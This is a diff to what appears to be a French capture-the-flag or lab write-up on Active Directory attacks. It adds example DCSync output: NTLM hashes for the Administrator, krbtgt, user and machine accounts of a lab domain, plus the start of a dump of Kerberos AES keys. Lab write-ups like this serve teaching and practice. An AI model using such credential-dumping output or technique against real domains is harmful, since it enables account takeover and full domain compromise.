@@ -406,6 +406,22 @@ Flag à soumettre : be0c07d7a82f4e1a9b7c3a5a6f7b8c9d
 
 Exemple de resultat du DSYNC 
 
+ci dessous les hash NTLM
+```shell
+    Administrator:500:aad3b435b51404eeaad3b435b51404ee:d6f22bdacd93357020c9ecc5eb0fd329:::
+    Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+    krbtgt:502:aad3b435b51404eeaad3b435b51404ee:eec1c91cba5e46ef9be464376bd12e60:::
+    rome.local\lala:1104:aad3b435b51404eeaad3b435b51404ee:32086bb2f6715b39ab8e88183f758cab:::
+    rome.local\fifi:1107:aad3b435b51404eeaad3b435b51404ee:d7abfd2645b8206c886d736fd0664f41:::
+    rome.local\toto:1108:aad3b435b51404eeaad3b435b51404ee:114f9f67317a0247ab51bb87641979ce:::
+    rome.local\titi:1109:aad3b435b51404eeaad3b435b51404ee:36afe8d8d2ce73ce31f8a38c981f4040:::
+    ATHENA$:1000:aad3b435b51404eeaad3b435b51404ee:4766d5a0b03c27dc13ee68a3773a9176:::
+    NIAGARA$:1103:aad3b435b51404eeaad3b435b51404ee:63f2b6a853f146053b9968af62fb8fe1:::
+    ANUNAKIN$:1105:aad3b435b51404eeaad3b435b51404ee:652c1be004ef335aa218cfed8e9297fc:::
+    OLYMPE$:1106:aad3b435b51404eeaad3b435b51404ee:652c1be004ef335aa218cfed8e9297fc:::
+```
+
+ci dessous les clés Kerberos
 ``` shell
     [*] Kerberos keys grabbed
     Administrator:aes256-cts-hmac-sha1-96:633c7562bd5ba07fe8c4c1377e425b7f2321b888d1062a3eea6faa56c699bdb8
